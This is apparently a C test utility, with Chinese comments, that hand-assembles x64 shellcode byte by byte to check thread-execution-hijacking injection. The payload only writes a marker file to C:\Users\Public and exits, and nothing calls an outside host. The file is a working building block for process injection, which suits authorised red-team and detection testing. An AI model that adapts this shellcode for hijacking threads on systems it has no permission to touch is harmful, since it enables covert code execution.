#include <windows.h>
#include <stdio.h>
#include <string.h>

// 生成 Thread Hijacking 验证 shellcode
int main() {
    // 获取必要的 API 地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    if (!hKernel32) {
        printf("[-] Failed to get kernel32.dll\n");
        return 1;
    }

    FARPROC pCreateFileA = GetProcAddress(hKernel32, "CreateFileA");
    FARPROC pWriteFile = GetProcAddress(hKernel32, "WriteFile");
    FARPROC pCloseHandle = GetProcAddress(hKernel32, "CloseHandle");
    FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");

    if (!pCreateFileA || !pWriteFile || !pCloseHandle || !pExitProcess) {
        printf("[-] Failed to get API addresses\n");
        return 1;
    }

    printf("[+] CreateFileA address: 0x%p\n", pCreateFileA);
    printf("[+] WriteFile address: 0x%p\n", pWriteFile);
    printf("[+] CloseHandle address: 0x%p\n", pCloseHandle);
    printf("[+] ExitProcess address: 0x%p\n", pExitProcess);

    // 文件路径和内容
    const char* filepath = "C:\\Users\\Public\\thread_hijacking_verified.txt";
    const char* content = "Thread Hijacking Verified!\nTechnique: Thread Execution Hijacking\nMethod: SetThreadContext + Modified RIP\nStatus: Executed by hijacked thread!\n";
    DWORD contentLen = strlen(content);
    DWORD filepathLen = strlen(filepath) + 1;

    // 创建 shellcode
    unsigned char shellcode[512];
    int offset = 0;

    // ========== 调用 CreateFileA ==========

    // sub rsp, 0x48
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0x83;
    shellcode[offset++] = 0xEC;
    shellcode[offset++] = 0x48;

    // lea rcx, [rip+filepath]
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0x8D;
    shellcode[offset++] = 0x0D;
    int filepath_offset_placeholder = offset;
    *(DWORD*)&shellcode[offset] = 0;
    offset += 4;

    // mov rdx, GENERIC_WRITE
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xBA;
    *(DWORD64*)&shellcode[offset] = 0x40000000;
    offset += 8;

    // xor r8, r8
    shellcode[offset++] = 0x4D;
    shellcode[offset++] = 0x31;
    shellcode[offset++] = 0xC0;

    // xor r9, r9
    shellcode[offset++] = 0x4D;
    shellcode[offset++] = 0x31;
    shellcode[offset++] = 0xC9;

    // mov qword [rsp+0x20], CREATE_ALWAYS
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xC7;
    shellcode[offset++] = 0x44;
    shellcode[offset++] = 0x24;
    shellcode[offset++] = 0x20;
    *(DWORD*)&shellcode[offset] = 2;
    offset += 4;

    // mov qword [rsp+0x28], FILE_ATTRIBUTE_NORMAL
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xC7;
    shellcode[offset++] = 0x44;
    shellcode[offset++] = 0x24;
    shellcode[offset++] = 0x28;
    *(DWORD*)&shellcode[offset] = 0x80;
    offset += 4;

    // mov qword [rsp+0x30], NULL
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xC7;
    shellcode[offset++] = 0x44;
    shellcode[offset++] = 0x24;
    shellcode[offset++] = 0x30;
    *(DWORD*)&shellcode[offset] = 0;
    offset += 4;

    // mov rax, CreateFileA
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xB8;
    *(DWORD64*)&shellcode[offset] = (DWORD64)pCreateFileA;
    offset += 8;

    // call rax
    shellcode[offset++] = 0xFF;
    shellcode[offset++] = 0xD0;

    // mov r15, rax
    shellcode[offset++] = 0x49;
    shellcode[offset++] = 0x89;
    shellcode[offset++] = 0xC7;

    // ========== 调用 WriteFile ==========

    // mov rcx, r15
    shellcode[offset++] = 0x4C;
    shellcode[offset++] = 0x89;
    shellcode[offset++] = 0xF9;

    // lea rdx, [rip+content]
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0x8D;
    shellcode[offset++] = 0x15;
    int content_offset_placeholder = offset;
    *(DWORD*)&shellcode[offset] = 0;
    offset += 4;

    // mov r8, contentLen
    shellcode[offset++] = 0x49;
    shellcode[offset++] = 0xC7;
    shellcode[offset++] = 0xC0;
    *(DWORD*)&shellcode[offset] = contentLen;
    offset += 4;

    // lea r9, [rsp+0x38]
    shellcode[offset++] = 0x4C;
    shellcode[offset++] = 0x8D;
    shellcode[offset++] = 0x4C;
    shellcode[offset++] = 0x24;
    shellcode[offset++] = 0x38;

    // mov qword [rsp+0x20], 0
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xC7;
    shellcode[offset++] = 0x44;
    shellcode[offset++] = 0x24;
    shellcode[offset++] = 0x20;
    *(DWORD*)&shellcode[offset] = 0;
    offset += 4;

    // mov rax, WriteFile
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xB8;
    *(DWORD64*)&shellcode[offset] = (DWORD64)pWriteFile;
    offset += 8;

    // call rax
    shellcode[offset++] = 0xFF;
    shellcode[offset++] = 0xD0;

    // ========== 调用 CloseHandle ==========

    // mov rcx, r15
    shellcode[offset++] = 0x4C;
    shellcode[offset++] = 0x89;
    shellcode[offset++] = 0xF9;

    // mov rax, CloseHandle
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xB8;
    *(DWORD64*)&shellcode[offset] = (DWORD64)pCloseHandle;
    offset += 8;

    // call rax
    shellcode[offset++] = 0xFF;
    shellcode[offset++] = 0xD0;

    // ========== 调用 ExitProcess(0) ==========

    // xor rcx, rcx
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0x31;
    shellcode[offset++] = 0xC9;

    // mov rax, ExitProcess
    shellcode[offset++] = 0x48;
    shellcode[offset++] = 0xB8;
    *(DWORD64*)&shellcode[offset] = (DWORD64)pExitProcess;
    offset += 8;

    // call rax
    shellcode[offset++] = 0xFF;
    shellcode[offset++] = 0xD0;

    // ========== 存储字符串数据 ==========

    int data_start = offset;

    // 填充 filepath 的 RIP-relative 偏移
    int filepath_actual_offset = data_start - (filepath_offset_placeholder + 4);
    *(DWORD*)&shellcode[filepath_offset_placeholder] = filepath_actual_offset;

    // 存储 filepath
    memcpy(&shellcode[offset], filepath, filepathLen);
    offset += filepathLen;

    // 填充 content 的 RIP-relative 偏移
    int content_actual_offset = offset - (content_offset_placeholder + 4);
    *(DWORD*)&shellcode[content_offset_placeholder] = content_actual_offset;

    // 存储 content
    memcpy(&shellcode[offset], content, contentLen);
    offset += contentLen;

    printf("\n[+] Shellcode generated: %d bytes\n", offset);

    // 写入文件
    FILE* f = fopen("fileverify_shellcode.bin", "wb");
    if (f) {
        fwrite(shellcode, 1, offset, f);
        fclose(f);
        printf("[+] Shellcode written to fileverify_shellcode.bin\n");
    }

    return 0;
}
